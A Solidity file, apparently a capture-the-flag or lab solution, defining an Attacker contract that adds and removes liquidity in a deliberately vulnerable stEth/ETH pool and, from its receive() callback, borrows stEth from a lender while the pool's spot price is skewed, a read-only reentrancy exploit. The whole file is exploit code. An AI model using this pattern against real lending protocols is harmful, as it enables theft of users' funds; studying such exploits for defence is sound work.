// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface IVulnerablePool {
    function addLiquidity(
        uint256 stEth_amount,
        uint256 eth_amount
    ) external payable returns (uint256);

    function removeLiquidity(
        uint256 lp_amount
    ) external returns (uint256, uint256);

    function getSpotPriceStEth(uint256 amount) external view returns (uint256);

    function getSpotPriceEth(uint256 amount) external view returns (uint256);
}

interface IReaderLender {
    function borrowStEth(uint256 amount) external payable;

    function repay() external payable;
}

contract Attacker {
    uint256 private constant FEE_PERCENTAGE = 5;
    uint256 private constant OVERCOLLATERALLIZATION_PERCENTAGE = 150;
    IVulnerablePool public target;
    IReaderLender public reader;
    IERC20 public stEth;
    bool public retrieving;

    constructor(address _token, address _target, address _reader) {
        target = IVulnerablePool(_target);
        reader = IReaderLender(_reader);
        stEth = IERC20(_token);
    }

    receive() external payable {
        // Borrow stEth at lower collateral
        uint256 price = target.getSpotPriceStEth(1 ether);
        uint256 required_collateral = (price * (150 + 5)) / 100;

        reader.borrowStEth{value: required_collateral}(1 ether);
    }

    function exploit() public payable {
        // Add liquidity
        stEth.approve(address(target), 2 ether);
        uint256 lpAmount = target.addLiquidity{value: 2 ether}(
            2 ether,
            2 ether
        );

        // Remove liquidity
        target.removeLiquidity(lpAmount);
    }
}
